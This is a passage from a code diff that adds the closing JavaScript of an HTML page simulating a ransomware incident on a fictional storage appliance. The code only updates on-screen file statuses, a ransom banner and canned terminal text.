+      document.getElementById('locked-count').textContent = '4 / 4 ENCRYPTED';
+      document.getElementById('locked-count').style.color = '#ef4444';
+      ransomBox.style.display = 'block';
+    }
+  } else {
+    resetStateUI();
+  }
+
+  await typeTerminal(matchedPreset.output);
+}
+
+function resetStateUI() {
+  const heartbeat = document.getElementById('system-heartbeat');
+  const heartbeatText = document.getElementById('heartbeat-text');
+  const term = document.getElementById('term-output');
+  const ransomBox = document.getElementById('ransom-box');
+
+  heartbeat.classList.remove('alarm');
+  heartbeatText.textContent = 'STORAGE DAEMON NORMAL';
+  term.classList.remove('alarm');
+  ransomBox.style.display = 'none';
+
+  // Reset files
+  document.getElementById('f-1').className = 'file-item';
+  document.getElementById('s-1').textContent = 'CLEAN (PLAINTEXT)';
+  document.getElementById('f-2').className = 'file-item';
+  document.getElementById('s-2').textContent = 'CLEAN (PLAINTEXT)';
+  document.getElementById('f-3').className = 'file-item';
+  document.getElementById('s-3').textContent = 'CLEAN (PLAINTEXT)';
+  document.getElementById('f-4').className = 'file-item';
+  document.getElementById('s-4').textContent = 'CLEAN (PLAINTEXT)';
+  document.getElementById('locked-count').textContent = '0 / 4 Encrypted';
+  document.getElementById('locked-count').style.color = '#10b981';
+  animatePipeline(1);
+}
+
+function resetLab() {
+  const btn1 = document.querySelectorAll('.preset-btn')[0];
+  applyPreset(1, btn1);
+  resetStateUI();
+  document.getElementById('term-output').innerHTML = `[root@apexvault-appliance ~]# systemctl restart apexvault-storage
+[✓] Storage daemon reloaded. Clean state restored.
+[!] All encrypted archives decrypted and restored from cold storage.
+[!] Appliance ready for diagnostics.` + '<span class="term-cursor"></span>';
+}
+
+// Initial Auto Run
+window.addEventListener('DOMContentLoaded', () => {
+  const p3 = presets[3];
+  applyPreset(3, document.querySelectorAll('.preset-btn')[2]);
+});
+</script>
+
+</body>
+</html>
